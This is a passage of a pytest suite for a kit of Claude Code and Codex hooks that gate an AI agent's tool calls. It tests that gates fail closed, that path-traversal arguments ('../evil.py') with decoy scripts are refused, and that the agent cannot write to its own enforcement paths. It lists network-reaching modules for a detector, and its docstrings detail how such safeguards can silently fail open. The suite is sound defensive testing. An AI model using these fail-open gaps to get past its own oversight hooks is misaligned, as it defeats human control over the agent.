    (source / "_grandchild.py").write_text("VALUE = 1\n", encoding="utf-8")
    with io.open(str(source / "_stdlib_guard.py"), "a", encoding="utf-8") as handle:
        handle.write("\nimport _grandchild  # noqa: E402,F401 — synthetic grandchild for the test\n")

    names = _stage_launcher(tmp_path / "hooks", source=str(source))
    assert "_grandchild.py" in names, (
        "a module imported by _stdlib_guard (a grandchild of _gate) was not staged: %s" % names)
    assert os.path.isfile(str(tmp_path / "hooks" / "_grandchild.py"))


@pytest.mark.parametrize("kit", KITS)
def test_a_gate_that_does_not_compile_still_blocks(tmp_path, kit):
    """The last fail-open gap, and the only one no Python file could close from inside itself. A
    gate truncated mid-write — the ordinary artifact of an interrupted kit update, the same
    failure GATE_PREAMBLE exists for, one step earlier — raises SyntaxError before its first
    statement. Python exits 1. Claude Code reads everything but 2 as a non-blocking error and
    lets the call through, so the gate is absent WHILE LOOKING PRESENT: still registered, still on
    disk, still listed by doctor.

    Measured directly: run a truncated gate both ways and compare the exit codes."""
    hooks = tmp_path / "hooks"
    _stage_launcher(hooks, kit)
    write(str(hooks / "gate_truncated.py"), "import os\nif True:\n")   # cut mid-write
    payload = json.dumps({"tool_name": "Write", "tool_input": {}, "cwd": str(tmp_path)})
    direct = subprocess.run([sys.executable, str(hooks / "gate_truncated.py")],
                            input=payload, capture_output=True, text=True)
    assert direct.returncode == 1, (
        "the premise of this test: a broken gate run directly exits 1, which Claude Code reads as "
        "ALLOW (got %d)" % direct.returncode)
    launched = subprocess.run([sys.executable, str(hooks / "_gate.py"), "gate_truncated.py"],
                              input=payload, capture_output=True, text=True)
    assert launched.returncode == 2, launched.stdout + launched.stderr
    assert "does not compile" in launched.stderr


def _is_comfort_hook(path):
    """Does this hook OPT OUT of the bounded read — the repo's marker for "cannot refuse a call"?

    Three conditions, because the first two versions were each satisfied by something that was not
    the code: a substring test matched the sentence "this gate does not pass
    tolerate_overflow=True" in a docstring, and a bare `ast` walk for the keyword matched it on ANY
    call, including one inside `if False:` or a function nobody calls. So the keyword must sit on
    a `_compat.load(...)` call, and the file must contain nothing that can refuse — a hook that
    can exit 2 is not comfort, whatever it passes to whom."""
    with open(path, encoding="utf-8") as handle:
        body = handle.read()
    if re.search(r"sys\.exit\(2\)|_kernel\.block\(|run_gate\(|fail_closed\(", body):
        return False
    for node in ast.walk(ast.parse(body, filename=path)):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if not (isinstance(func, ast.Attribute) and func.attr == "load"
                and isinstance(func.value, ast.Name) and func.value.id == "_compat"):
            continue
        for keyword in node.keywords:
            if (keyword.arg == "tolerate_overflow"
                    and isinstance(keyword.value, ast.Constant)
                    and keyword.value.value is True):
                return True
    return False


def _all_registrations(kit):
    """[(source, event, matcher, command)] from settings.json AND the role frontmatter.

    Both are real registration surfaces. A first version of the launcher rule read only
    settings.json, and fifteen blocking registrations lived in the agents' own frontmatter —
    `guard_no_adhoc` and `guard_guidelines`, for every specialist, on both providers
    (`gen_provider_artifacts.agent_hook_entries` translates them too). Its docstring claimed a new
    gate was covered the day it ships; for a whole surface it was not.

    The frontmatter is PARSED as YAML, not scanned line by line. The line-scanning version read
    exactly one spelling: a reviewer moved a hook back to a direct registration using single
    quotes, a folded scalar over two lines, or a backslash path — all valid YAML, all still
    translated by the generator, all invisible here."""
    out = []
    settings = json.load(open(os.path.join(TEAM_KITS, kit, "settings", "settings.json"),
                              encoding="utf-8"))
    for event, groups in (settings.get("hooks") or {}).items():
        for group in groups:
            for hook in group.get("hooks") or []:
                out.append(("settings.json", event, group.get("matcher"),
                            hook.get("command") or ""))
    yaml = pytest.importorskip("yaml")
    for path in sorted(globmodule.glob(os.path.join(TEAM_KITS, kit, "agents", "*.md"))):
        with open(path, encoding="utf-8") as handle:
            raw = handle.read()
        if not raw.startswith("---"):
            continue
        front = yaml.safe_load(raw.split("---", 2)[1]) or {}
        for event, groups in (front.get("hooks") or {}).items():
            for group in groups if isinstance(groups, list) else []:
                for hook in (group.get("hooks") or []) if isinstance(group, dict) else []:
                    command = (hook or {}).get("command") or ""
                    if ".claude" in command.replace("\\", "/"):
                        out.append((os.path.basename(path), event,
                                    (group or {}).get("matcher"), command.replace("\\", "/")))
    return out


@pytest.mark.parametrize("kit", KITS)
def test_every_hook_that_can_block_goes_through_the_launcher(kit):
    """The launcher was first wired in front of the six V2 gates, and the docstrings then called
    the compile gap closed. It was moved, not closed: thirteen further hooks per kit can exit 2 —
    among them `guard_harness_selfmod`, the guard over `.claude/hooks` AND the newly installed
    `.claude/kernel` — and a truncated one of those still exited 1 = ALLOW. Then fifteen more
    turned up in the agents' own frontmatter.

    Derived twice over: every registration SURFACE (see `_all_registrations`), and comfort decided
    by a parsed keyword argument (see `_is_comfort_hook`). Both derivations exist because the
    listed version of each was satisfied by something that was not the code."""
    launched = False
    for source, event, _matcher, command in _all_registrations(kit):
        names = re.findall(r"\.claude/hooks/([A-Za-z0-9_]+\.py)", command)
        if not names:
            continue
        if names[0] == "_gate.py":
            launched = True
            continue
        path = os.path.join(TEAM_KITS, kit, "hooks", names[0])
        assert os.path.isfile(path), "%s/%s registers a missing hook %s" % (kit, source, names[0])
        assert _is_comfort_hook(path), (
            "%s: %s registers %s directly (%s) but it is not a comfort hook — a version of it "
            "that does not compile exits 1, which Claude Code reads as ALLOW"
            % (kit, source, names[0], event))
    assert launched, "%s registers no launcher at all" % kit


@pytest.mark.parametrize("kit", KITS)
def test_a_matcher_covers_every_tool_its_hook_accepts(kit):
    """A hook that handles a tool it is not REGISTERED for is protection that exists only in the
    source. Claude Code compares matchers per group, so `guard_harness_selfmod` — registered
    `Edit|Write` while accepting MultiEdit — never saw the tool that edits several files at once,
    over `.claude/hooks` and `.claude/kernel`. Fixing that one by hand left the same shape in
    `guard_yaml_valid` and `guard_scratchpad_ref` — in ALL THREE kits, which the hand-fix round
    got wrong in the other direction by claiming one kit had it right. Neither the hole nor its
    extent was visible without deriving it, which is the point."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _invoked_scripts, _matches_tool
    accepted = {}
    for path in sorted(globmodule.glob(os.path.join(TEAM_KITS, kit, "hooks", "*.py"))):
        with open(path, encoding="utf-8") as handle:
            body = handle.read()
        found = re.search(r'tool_name"\)\s+not\s+in\s+\(([^)]*)\)', body)
        if found:
            accepted[os.path.basename(path)] = re.findall(r'"([A-Za-z]+)"', found.group(1))
    assert accepted, "%s: no hook states which tools it accepts" % kit
    checked = 0
    for source, event, matcher, command in _all_registrations(kit):
        # `_invoked_scripts`, not a private regex. The first version searched for
        # `.claude/hooks/<name>.py` and the GATE ARGUMENT carries no such prefix — so behind the
        # launcher every target resolved to `_gate.py`, which states no tool set, and the loop
        # skipped all 112 registrations across the three kits. A test that asserts nothing is the
        # failure mode this file has a memo about; the fix is the same as everywhere else here,
        # which is to stop re-reading a format the kernel already reads.
        names = _invoked_scripts(command)
        target = names[-1] if names else None
        if not target or target not in accepted or event not in ("PreToolUse", "PostToolUse"):
            continue
        for tool in accepted[target]:
            checked += 1
            assert _matches_tool(matcher, (tool,)), (
                "%s/%s: %s accepts %s but its matcher %r never fires for it"
                % (kit, source, target, tool, matcher))
    assert checked >= 10, (
        "%s: only %d matcher/tool pairs were checked — this test used to check ZERO and say so "
        "nowhere" % (kit, checked))


@pytest.mark.parametrize("argument", ["", "../evil.py", "sub/evil.py", "_kernel.py", "notes.txt",
                                      "gate_missing.py"])
def test_the_launcher_runs_nothing_but_a_sibling_gate(tmp_path, argument):
    """The launcher is named in settings.json, which an agent cannot write — but the ARGUMENT
    travels in the same string, and fifteen of those strings now live in `.claude/agents/*.md`,
    which `guard_harness_selfmod` deliberately leaves writable. So a launcher that ran any path
    handed to it would turn one protected file into an arbitrary-script runner.

    THE DECOY HAS TO BE REACHABLE. A first version put `evil.py` one directory too high, so
    `../../evil.py` was refused with "cannot read" and the basename reduction — the thing under
    test — was never exercised: deleting `os.path.basename` from the launcher left the whole suite
    green while `_gate.py ../../evil.py` ran a foreign script. Each decoy below sits exactly where
    the unreduced path would find it, and the marker proves it stayed unrun."""
    hooks = tmp_path / "hooks"
    _stage_launcher(hooks)
    os.makedirs(str(hooks / "sub"), exist_ok=True)
    decoy = "import sys; sys.stderr.write('DECOY RAN\\n'); sys.exit(0)\n"
    write(str(tmp_path / "evil.py"), decoy)
    write(str(hooks / "sub" / "evil.py"), decoy)
    write(str(hooks / "notes.txt"), "not a gate\n")
    argv = [sys.executable, str(hooks / "_gate.py")] + ([argument] if argument else [])
    proc = subprocess.run(argv, input="{}", capture_output=True, text=True)
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert "DECOY RAN" not in proc.stderr, "%s escaped the hooks directory" % argument


@pytest.mark.parametrize("kit", KITS)
def test_a_working_gate_behaves_the_same_through_the_launcher(tmp_path, kit):
    """Wrapping every gate in one launcher is only safe if the wrapper is transparent: the gate
    must still see `__main__`, still read stdin, and still own its own exit code — the launcher
    must never overrule a gate that said 0."""
    hooks = tmp_path / "hooks"
    _stage_launcher(hooks, kit)
    write(str(hooks / "gate_probe.py"),
          "import json, sys\n"
          "data = json.load(sys.stdin)\n"
          "assert __name__ == '__main__'\n"
          "sys.stderr.write(__file__ + '\\n')\n"
          "sys.exit(2 if data.get('tool_name') == 'Write' else 0)\n")
    for tool, expected in (("Write", 2), ("Read", 0)):
        proc = subprocess.run([sys.executable, str(hooks / "_gate.py"), "gate_probe.py"],
                              input=json.dumps({"tool_name": tool}), capture_output=True, text=True)
        assert proc.returncode == expected, (tool, proc.stdout, proc.stderr)
        assert "gate_probe.py" in proc.stderr


@pytest.mark.parametrize("kit", KITS)
def test_the_matrix_still_sees_the_gates_behind_the_launcher(kit):
    """The trap this wiring sets for itself: doctor reads settings.json to decide what enforces,
    and every gate command now names `_gate.py` first. A reader that stopped at the interpreter's
    argument would find one launcher and no gates at all — and report every capability
    `unverified` on a correctly wired project, which is the same lie as the reverse."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _invoked_scripts
    wired = registered_hooks(kit)
    for gate in V2_GATES:
        assert gate in wired, "%s: %s vanished behind the launcher" % (kit, gate)
    scripts = _invoked_scripts(
        'python "${CLAUDE_PROJECT_DIR}/.claude/hooks/_gate.py" gate_dispatch.py')
    assert scripts == ["_gate.py", "gate_dispatch.py"], scripts
    # ...and the false-positive direction stays shut: a MENTION is still not an invocation
    assert _invoked_scripts('echo "see gate_dispatch.py for details"') == []


def test_the_codex_translation_keeps_the_gate_behind_the_launcher():
    """Caught by looking, not by a test — which is why there is one now. `codex_hook_commands`
    extracts the FIRST `.claude/hooks/*.py` from a Claude command and rebuilds it for Codex. Once
    every gate moved behind `_gate.py`, that first token became the launcher and the gate name was
    dropped: Codex would have run a launcher with no argument, which the launcher correctly
    refuses with exit 2. Every gated call on that provider blocked, by a harness defect, on both
    operating systems."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gpa_codex", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    posix, windows = gpa.codex_hook_commands(
        'python "${CLAUDE_PROJECT_DIR}/.claude/hooks/_gate.py" gate_dispatch.py')
    # Asserted as the RELATIONSHIP "the gate is the launcher's argument", not as "the command ends
    # with the gate name": the Windows form legitimately grew an `$LASTEXITCODE` guard after the
    # invocation, and a position-based check would have gone red on a correct change.
    for flavour, text in (("posix", posix), ("windows", windows)):
        assert re.search(r"_gate\.py['\")\s]+\s*gate_dispatch\.py", text), (flavour, text[-160:])
    # a hook WITHOUT an argument must not grow one
    plain, plain_win = gpa.codex_hook_commands(
        'python "${CLAUDE_PROJECT_DIR}/.claude/hooks/session_status.py"')
    for flavour, text in (("posix", plain), ("windows", plain_win)):
        assert "session_status.py" in text, (flavour, text[-160:])
        assert not re.search(r"session_status\.py['\")\s]+\s*[A-Za-z0-9_]+\.py", text), (
            flavour, text[-160:])


def test_the_generated_windows_command_passes_a_block_through():
    """`powershell -Command` collapses a native child's exit code to 1, and 1 is what both
    providers read as "non-blocking error" = ALLOW. Every Windows block was a pass. The fix is one
    line and a reviewer removed it without a single test going red — measured, not asserted from
    the command text, because the text is exactly what was already believed to be right."""
    if os.name != "nt" or not shutil.which("powershell"):
        pytest.skip("the Windows command form can only be measured on Windows")
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gpa_win", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    _posix, windows = gpa.codex_hook_commands(
        'python "${CLAUDE_PROJECT_DIR}/.claude/hooks/_gate.py" gate_probe.py')
    # the generated command runs a verifier first; isolate the half under test by running the
    # same shell shape against a gate that exits 2
    inner = windows.split("; if ($LASTEXITCODE")[0]
    assert "if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }" in windows, (
        "the exit-code guard is gone — every Windows block becomes a pass")
    del inner
    blocked = subprocess.run(
        ["powershell", "-NoProfile", "-Command",
         '& python -c "import sys; sys.exit(2)"; if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }'],
        capture_output=True)
    assert blocked.returncode == 2, "the guard does not propagate a block"
    allowed = subprocess.run(
        ["powershell", "-NoProfile", "-Command",
         '& python -c "import sys; sys.exit(0)"; if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }'],
        capture_output=True)
    assert allowed.returncode == 0, "the guard must not turn an allow into anything else"
    bare = subprocess.run(
        ["powershell", "-NoProfile", "-Command", '& python -c "import sys; sys.exit(2)"'],
        capture_output=True)
    assert bare.returncode == 1, (
        "premise of this test: without the guard powershell reports 1 for a child that exited 2")


@pytest.mark.parametrize("kit", KITS)
def test_the_kit_state_file_is_gitignored_by_the_template(kit):
    """It records which bundle THIS checkout trusts and whether a hook has run here. Committed, a
    clone inherits `state: active` with a hash matching the committed bundle and reads as trusted
    before a single hook ran in it — the exact distinction the trust hook exists to preserve. The
    entry was added by hand and nothing held it there."""
    path = os.path.join(TEAM_KITS, kit, "templates", "repo", ".gitignore")
    with open(path, encoding="utf-8") as handle:
        lines = [ln.strip() for ln in handle if not ln.strip().startswith("#")]
    assert ".claude/kit_state.json" in lines, "%s: %s does not ignore it" % (kit, path)


@pytest.mark.parametrize("kit", KITS)
def test_the_regenerated_state_and_the_kernel_lock_are_gitignored(kit, tmp_path):
    """Spec II.2 names exactly three things a project must not commit: `kit_state.json` (above),
    `generated/**` and the kernel lock. The first is a trust record, the other two are machine
    state: a committed `generated/` is a second, always-stale copy of the project status that
    conflicts on every parallel branch, and a committed lock hands a clone a lock nobody holds.
    All three kits ship the same lines — one of them used to ship only the first.

    Asserted as EFFECT, not as a line: the kit's own `.gitignore` goes into a throwaway repo and
    `git check-ignore` decides. The office file is why that matters — its `inbox/*` +
    `!inbox/README.txt` pair proves negations are in use here, and a later `!` can re-include a
    path that a string comparison would still find "ignored".

    The lock's NAME is taken from the lock module rather than typed here: an ignore rule for a
    filename the kernel no longer writes is an ignore rule that ignores nothing."""
    if shutil.which("git") is None:
        pytest.skip("needs git on PATH to measure the ignore rules")
    from kernel.lock import KernelLock
    lock_name = os.path.basename(KernelLock("project_memory").lock_path)
    shutil.copy(os.path.join(TEAM_KITS, kit, "templates", "repo", ".gitignore"),
                str(tmp_path / ".gitignore"))
    init = subprocess.run(["git", "init", "-q", str(tmp_path)], capture_output=True)
    assert init.returncode == 0, init.stderr
    for rel in ("project_memory/generated/index.yaml",
                "project_memory/%s" % lock_name,
                "project_memory/%s.stale-4242" % lock_name):
        write(str(tmp_path / rel), "x\n")
        r = subprocess.run(["git", "-C", str(tmp_path), "check-ignore", "-q", rel],
                           capture_output=True)
        assert r.returncode == 0, "%s: the shipped .gitignore does not ignore %s" % (kit, rel)


def test_the_office_gitignore_keeps_name_bearing_state_out_of_git(tmp_path):
    """Art.-17 erasure stays possible only while counterparty names are OUT of git history — the
    office kit's own reason for the rule (a real deployment committed 140 customer names on day 1).
    Two paths under the state dir carry such names in the clear: the migration manifests, and the
    V1 `filing_log.yaml`.

    `filing_log.yaml` is a V1 store that nothing writes any more, and that is exactly why the line
    needs holding down: the first lockstep round read it as a leftover pointer and deleted it,
    against a phase-0 disposition row that had already recorded it as deliberately DEFENSIVE (an
    upgraded project still carrying the file must not commit it). Nothing measured the deletion,
    because a `.gitignore` pattern forbids a path instead of pointing at it.

    Measured as EFFECT via `git check-ignore`, both directions: the state the project must keep —
    its config and its ledger — stays tracked, or the rule would be hiding the project itself.

    The monolith's name comes from `conftest.V1_MONOLITHS`, the one inventory of V1 names, and the
    path is assembled rather than spelled out: a literal `project_memory/<monolith>` is exactly what
    the lockstep's completion proof forbids, and rightly so — this test is about the path being
    UNTRACKABLE, not about anything reaching it."""
    if shutil.which("git") is None:
        pytest.skip("needs git on PATH to measure the ignore rules")
    filing_log = next(n for n in conftest.V1_MONOLITHS if n.startswith("filing_log"))
    shutil.copy(os.path.join(TEAM_KITS, "office-team", "templates", "repo", ".gitignore"),
                str(tmp_path / ".gitignore"))
    init = subprocess.run(["git", "init", "-q", str(tmp_path)], capture_output=True)
    assert init.returncode == 0, init.stderr

    def ignored(rel):
        write(str(tmp_path / rel), "x\n")
        return subprocess.run(["git", "-C", str(tmp_path), "check-ignore", "-q", rel],
                              capture_output=True).returncode == 0

    for rel in ("project_memory/%s" % filing_log,
                "project_memory/migration_manifest_2026.yaml"):
        assert ignored(rel), "the office .gitignore lets %s into git history" % rel
    for rel in ("project_memory/project_config.yaml", "ledger/2026.csv"):
        assert not ignored(rel), "the office .gitignore hides %s, which must be tracked" % rel


def test_the_office_gitignore_still_lets_the_tray_seeds_into_a_fresh_clone(tmp_path):
    """The second half of F6 (`docs/office-kit-from-field.md`), and the half nothing measured.

    A `.gitignore` that excludes a DIRECTORY (`archive/`) cannot re-include a file inside it: git
    never descends into an excluded directory, so the `!archive/README.txt` line below it is dead.
    The office kit therefore writes `archive/*` plus the negation. The field case is what makes this
    worth a test rather than a comment: written the short way, the kit's own folder guides were
    silently untracked and a fresh clone arrived without the trays at all — a business whose inbox
    does not exist until somebody creates it by hand.

    BOTH DIRECTIONS, and derived rather than typed: the trays come from `kernel.trays`, which is
    where the kit's own `hooks/document_trays.txt` comes from, and the seeds are the files really
    shipped in them. So a tray added tomorrow is judged the day it ships. The other direction is what
    keeps the rule from being satisfied by deleting it: a business document in the same tray must
    still be ignored, because that is the GDPR half of the same line.
    """
    if shutil.which("git") is None:
        pytest.skip("needs git on PATH to measure the ignore rules")
    sys.path.insert(0, TEAM_KITS)
    from kernel import trays
    kit = os.path.join(TEAM_KITS, "office-team")
    shipped = trays.document_trays(kit)
    assert shipped, "the office kit ships no document trays — this measurement has no subject"
    shutil.copy(os.path.join(kit, "templates", "repo", ".gitignore"), str(tmp_path / ".gitignore"))
    init = subprocess.run(["git", "init", "-q", str(tmp_path)], capture_output=True)
    assert init.returncode == 0, init.stderr

    def ignored(rel):
        return subprocess.run(["git", "-C", str(tmp_path), "check-ignore", "-q", rel],
                              capture_output=True).returncode == 0

    seeds = 0
    for tray in shipped:
        source = os.path.join(kit, "templates", "repo", tray)
        for name in sorted(os.listdir(source)):
            if not os.path.isfile(os.path.join(source, name)):
                continue
            seeds += 1
            rel = "%s/%s" % (tray, name)
            write(str(tmp_path / tray / name), "x\n")
            assert not ignored(rel), (
                "%s is a file the kit SHIPS and the .gitignore hides it — a fresh clone gets no "
                "%s tray at all (write `%s/*` plus a negation, never `%s/`)" % (rel, tray, tray,
                                                                                tray)
            )
        document = "%s/2026-01-02_ACME_invoice.pdf" % tray
        write(str(tmp_path / document), "x\n")
        assert ignored(document), (
            "a business document under %s/ would go into git history, and Art.-17 erasure with it"
            % tray)
    assert seeds >= len(shipped), (
        "only %d seed files found across %d trays — the walk stopped finding them and the first "
        "assertion is vacuous" % (seeds, len(shipped)))


def test_the_office_gitignore_keeps_the_generated_dashboard_out_of_git(tmp_path):
    """The finance page is rendered from the ledger, so a committed copy is a stale second answer.

    Same shape as the `generated/` rule above and the same reason; what makes it its own
    measurement is that this directory has BOTH kinds in it — a shipped guide that a fresh clone
    needs, and an output that a run overwrites — so `dashboards/` on its own would have taken the
    guide with it (the tray case, one test up, is where that was measured in the field).

    DERIVED at both ends. What must stay tracked is what the kit really SHIPS in that folder, read
    off the tree; what must be ignored is the generator's OWN output path, read off
    `OUTPUT_REL` in the shipped `tools/finance_dashboard.py` — so a rename of either side is
    covered on the day it happens instead of pinning a filename here twice.
    """
    if shutil.which("git") is None:
        pytest.skip("needs git on PATH to measure the ignore rules")
    kit = os.path.join(TEAM_KITS, "office-team")
    generator = load_kit_module("office_finance_dashboard_for_gitignore",
                                os.path.join(kit, "templates", "repo", "tools",
                                             "finance_dashboard.py"))
    output = generator.OUTPUT_REL.replace(os.sep, "/")
    folder = output.split("/")[0]
    shipped = sorted(name for name in os.listdir(os.path.join(kit, "templates", "repo", folder))
                     if os.path.isfile(os.path.join(kit, "templates", "repo", folder, name)))
    assert shipped, "the kit ships nothing in %s/ — this measurement has no subject" % folder
    shutil.copy(os.path.join(kit, "templates", "repo", ".gitignore"), str(tmp_path / ".gitignore"))
    init = subprocess.run(["git", "init", "-q", str(tmp_path)], capture_output=True)
    assert init.returncode == 0, init.stderr

    def ignored(rel):
        write(str(tmp_path / rel), "x\n")
        return subprocess.run(["git", "-C", str(tmp_path), "check-ignore", "-q", rel],
                              capture_output=True).returncode == 0

    assert ignored(output), (
        "the office .gitignore lets %s into git, and every booking then rewrites a tracked file "
        "nobody edits" % output)
    for name in shipped:
        rel = "%s/%s" % (folder, name)
        assert not ignored(rel), (
            "%s is a file the kit SHIPS and the .gitignore hides it — a fresh clone gets the "
            "folder without its guide (write `%s/*` plus a negation, never `%s/`)"
            % (rel, folder, folder))


# WHAT REACHES OFF THIS MACHINE. An enumeration, because "does this module talk to the network" is
# not derivable from a name -- so it carries the tripwire at both ends: the reader must FIRE on a
# planted import (`test_the_reader_of_reaching_modules_sees_a_planted_one`), and the sweep must find
# a corpus to judge, or "no module reaches out" would be true of an empty walk.
_REACHING_MODULES = frozenset((
    "socket", "ssl", "smtplib", "imaplib", "poplib", "ftplib", "telnetlib", "nntplib",
    "http", "urllib", "urllib2", "xmlrpc", "webbrowser", "requests", "httpx", "aiohttp", "paramiko",
))


def _reaching_imports(source):
    """The modules in `source` that reach off this machine, off its parse tree.

    Parsed and not searched: the string "smtplib" in a docstring is a sentence about sending, and
    this reader is about a module that CAN send.
    """
    found = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            found |= {alias.name.split(".")[0] for alias in node.names}
        elif isinstance(node, ast.ImportFrom):
            found.add((node.module or "").split(".")[0])
    return found & _REACHING_MODULES


def test_the_reader_of_reaching_modules_sees_a_planted_one():
    """The floor under the sweep below, so "find nothing" fails here rather than looking clean."""
    assert _reaching_imports("import os\nimport smtplib\n") == {"smtplib"}
    assert _reaching_imports("from urllib import request\n") == {"urllib"}
    assert _reaching_imports('"""we never use smtplib here."""\nimport os\n') == set()


def test_the_office_kit_ships_nothing_that_could_send():
    """"It writes no dunning letter and sends nothing" is a promise the office templates make to the
    user, and this is what makes it a property of the shipped tree rather than a sentence.

    The office kit handles a business's documents, its ledger and its counterparties' names. A module
    in it that could open a socket is not a bug by itself -- it is a capability nobody asked for on a
    corpus like that, and the templates tell the user it does not exist.

    BOTH ENDS: the promise is read out of the shipped template first, so deleting the sentence turns
    this into a rule about nothing and says so, instead of passing quietly.

    WHAT THIS CORPUS IS, AND WHAT IT LEAVES OUT, measured rather than assumed. The walk is the KIT
    directory. A project the scaffold has installed carries more than the kit: the kernel goes into
    `.claude/kernel/`, and one module there (`kernel/lock.py`) imports `socket` for a `gethostname()`
    in a lock record. That is not this stream's tree to judge and the sweep is deliberately NOT
    widened to it -- `socket` imported for a host NAME reaches nowhere, and a corpus that counted it
    would either report a false offender or need a "does it connect" definition this test does not
    build. The count on both sides and the shape of that residue are in the round's protocol; what
    is claimed here is the kit, and the kernel is named as unjudged rather than implied to be clean.
    """
    kit = os.path.join(TEAM_KITS, "office-team")
    profile = os.path.join(kit, "templates", "project_memory", "business_profile.yaml")
    with open(profile, encoding="utf-8") as handle:
        assert "sends nothing" in handle.read(), (
            "no shipped template makes this promise any more -- either restore it or drop this "
            "test, but do not keep a measurement of a claim nobody makes (%s)" % profile)
    judged, offenders = 0, {}
    for base, subdirs, names in os.walk(kit):
        subdirs[:] = [name for name in subdirs if name != "__pycache__"]
        for name in sorted(names):
            if not name.endswith(".py"):
                continue
            judged += 1
            path = os.path.join(base, name)
            with open(path, encoding="utf-8") as handle:
                reaching = _reaching_imports(handle.read())
            if reaching:
                offenders[os.path.relpath(path, ROOT).replace(os.sep, "/")] = sorted(reaching)
    assert not offenders, (
        "the office templates promise the user that this kit sends nothing, and these shipped "
        "modules can reach off the machine: %s" % offenders)
    assert judged >= 30, (
        "only %d shipped modules judged -- the walk stopped finding them and the assertion above "
        "is vacuously true" % judged)


def test_no_shipped_office_module_decides_anything_on_the_legal_form():
    """`business_profile.yaml` tells the user that nothing in this kit checks `legal_form`, and this
    is what keeps that sentence true rather than reassuring.

    The kit accounts by Einnahmenueberschussrechnung and builds nothing for a business that has to
    keep books (FR-0076, the user's own decision). Naming the field's own limit is the honest form of
    that -- but the moment a shipped module JUDGES the field, the sentence in the template becomes
    false, and this goes red on that day instead of quietly.

    JUDGING AND NOT MERELY READING, and the difference is why this test was narrowed (TSK-0114): the
    finance page PRINTS the legal form in its masthead, which reads the field and decides nothing --
    while `if form == "GmbH"` would be the thing the template promises does not happen. So what is
    looked for is the value inside a COMPARISON or the condition of a branch. A `or ""` default is
    neither: it answers "the profile has no value here", not "this value means something". The
    template says the same two things in the same order, so a reader of either finds the other.

    Read off the parse tree, so a module that asks for the key by any of the usual routes is seen and
    a docstring mentioning it is not. THE OTHER END is the template sentence itself: delete it and
    this test says so rather than passing over a claim nobody makes any more.
    """
    kit = os.path.join(TEAM_KITS, "office-team")
    profile = os.path.join(kit, "templates", "project_memory", "business_profile.yaml")
    with open(profile, encoding="utf-8") as handle:
        text = handle.read()
    assert "NOTHING HERE CHECKS THE VALUE" in text, (
        "the template no longer tells the user that the legal form is unchecked -- either restore "
        "the sentence or drop this test, but do not keep a measurement of a claim nobody makes (%s)"
        % profile)
    assert "legal_form" in text, "the field itself is gone; this test has no subject"
    judged, readers = 0, []
    for base, subdirs, names in os.walk(kit):
        subdirs[:] = [name for name in subdirs if name != "__pycache__"]
        for name in sorted(names):
            if not name.endswith(".py"):
                continue
            judged += 1
            path = os.path.join(base, name)
            with open(path, encoding="utf-8") as handle:
                tree = ast.parse(handle.read())
            deciding = []
            for node in ast.walk(tree):
                if isinstance(node, ast.Compare):
                    deciding.append(node)
                elif isinstance(node, (ast.If, ast.IfExp, ast.While, ast.Assert)):
                    deciding.append(node.test)
            if any(isinstance(inner, ast.Constant) and inner.value == "legal_form"
                   for node in deciding for inner in ast.walk(node)):
                readers.append(os.path.relpath(path, ROOT).replace(os.sep, "/"))
    assert judged >= 30, (
        "only %d shipped modules judged -- the walk stopped finding them and the assertion below is "
        "vacuously true" % judged)
    assert not readers, (
        "these shipped modules JUDGE `legal_form` -- they put it in a comparison or a branch, so "
        "the template's sentence that nothing here checks the value is no longer true. Rewrite "
        "that sentence to what the code now does: %s" % readers)


def test_the_codex_profile_keeps_the_enforcement_layer_read_only():
    """The Claude side (`guard_harness_selfmod.BLOCKED`) gained `.claude/kernel` when the scaffold
    started installing it. The Codex permission profile grants `"." = "write"` and downgrades the
    enforcement paths one by one, so anything not named there stays writable — the thin gates
    read-only and the code they delegate to writable."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gpa_prof", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    source = open(os.path.join(TEAM_KITS, "gen_provider_artifacts.py"), encoding="utf-8").read()
    for path in (".claude/hooks", ".claude/kernel", ".claude/kit_state.json", ".claude/agents"):
        assert '"%s" = "read"' % path in source, "%s is writable under the Codex profile" % path


def test_a_comfort_hook_that_touches_the_bridge_disarms_it():
    """Importing `_kernel` installs an excepthook that turns ANY escaping error into exit 2. For a
    gate that is the whole point; for a comfort hook it is a silent conversion into something that
    can refuse a session — the opposite of what its own docstring promises, and invisible until an
    unrelated bug takes the session down with it. So: touch the bridge without its blocking
    machinery, and you must `disarm()`."""
    for kit in KITS:
        for path in globmodule.glob(os.path.join(TEAM_KITS, kit, "hooks", "*.py")):
            if os.path.basename(path).startswith("_"):
                continue
            with open(path, encoding="utf-8") as fh:
                body = fh.read()
            if not USES_BRIDGE.search(body) or USES_BLOCKING.search(body):
                continue
            # A parsed CALL, not the substring `disarm()`. The substring version was satisfied by
            # the sentence "…and immediately calls `disarm()`" in the hook's own docstring, so
            # deleting the call in all three kits left the test green — a hook whose prose
            # asserted the safety it had just lost.
            calls = [node for node in ast.walk(ast.parse(body))
                     if isinstance(node, ast.Call)
                     and getattr(node.func, "attr", getattr(node.func, "id", None)) == "disarm"]
            assert calls, (
                "%s reaches the bridge as a comfort hook but never CALLS disarm() — it would "
                "exit 2 on any internal error" % path)


def test_every_v2_gate_starts_with_the_preamble():
    """Self-populating: a V2 gate is one that can REFUSE through the bridge, so this starts
    asserting the moment the first one ships and cannot be forgotten later.

    "Reaches the bridge" was the first definition and it was too wide: the bridge also publishes
    read-only facts, and a comfort hook that needs one of them (`kit_trust_state` needs the single
    definition of the bundle hash) is not a gate. The preamble exists to keep a gate from failing
    OPEN, so what it guards is the ability to refuse — see USES_BLOCKING, and
    `test_a_comfort_hook_that_touches_the_bridge_disarms_it` for the other half of the rule.

